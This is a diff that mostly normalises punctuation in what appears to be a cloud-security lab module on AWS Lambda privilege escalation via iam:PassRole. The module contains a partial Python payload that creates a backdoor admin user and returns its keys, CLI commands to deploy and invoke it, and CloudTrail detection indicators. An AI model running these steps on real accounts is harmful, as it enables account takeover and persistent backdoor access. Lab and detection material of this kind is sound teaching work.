@@ -1,21 +1,21 @@
-# Module 6 — Lambda Privilege Escalation via iam:PassRole
+# Module 6 - Lambda Privilege Escalation via iam:PassRole
 
 ## Attack chain
 Low-priv user with iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
-→ Creates Lambda with admin role → Invokes it → Lambda creates backdoor admin user
-→ Persistent long-term admin credentials
+| Creates Lambda with admin role - Invokes it → Lambda creates backdoor admin user
+| Persistent long-term admin credentials
 
 ## The three permissions
 None of these alone escalates privileges:
-- iam:PassRole — pass a role to an AWS service
-- lambda:CreateFunction — create a Lambda function
-- lambda:InvokeFunction — invoke a Lambda function
+- iam:PassRole - pass a role to an AWS service
+- lambda:CreateFunction - create a Lambda function
+- lambda:InvokeFunction - invoke a Lambda function
 
 Combined they allow full account takeover.
 
 ## Exploitation
 
-### Step 1 — Create malicious payload
+### Step 1 - Create malicious payload
 ```python
 import boto3, json
 
@@ -31,7 +31,7 @@ def lambda_handler(event, context):
             'SecretAccessKey': keys['AccessKey']['SecretAccessKey']}
 ```
 
-### Step 2 — Create Lambda with admin role (as low-priv attacker)
+### Step 2 - Create Lambda with admin role (as low-priv attacker)
 ```bash
 aws lambda create-function \
   --function-name privesc-backdoor \
@@ -42,20 +42,20 @@ aws lambda create-function \
   --profile lambda-attacker
 ```
 
-### Step 3 — Invoke it
+### Step 3 - Invoke it
 ```bash
 aws lambda invoke --function-name privesc-backdoor /tmp/output.json
 ```
-Returns backdoor-admin access keys with AdministratorAccess. AKIA prefix — permanent credentials.
+Returns backdoor-admin access keys with AdministratorAccess. AKIA prefix - permanent credentials.
 
 ## Impact
 Full account takeover with persistent backdoor. Even if attacker account is detected
 and disabled, backdoor-admin survives until manually found and deleted.
 
-## Detection — CloudTrail indicators
+## Detection - CloudTrail indicators
 - CreateFunction by low-priv user with high-privilege role in --role parameter
-- InvokeFunction immediately after CreateFunction — automated attack signature
-- CreateUser + AttachUserPolicy by Lambda execution role — backdoor creation pattern
+- InvokeFunction immediately after CreateFunction - automated attack signature
+- CreateUser + AttachUserPolicy by Lambda execution role - backdoor creation pattern
 - All three events in sequence within seconds = definitive escalation indicator
 
 ## Hardening
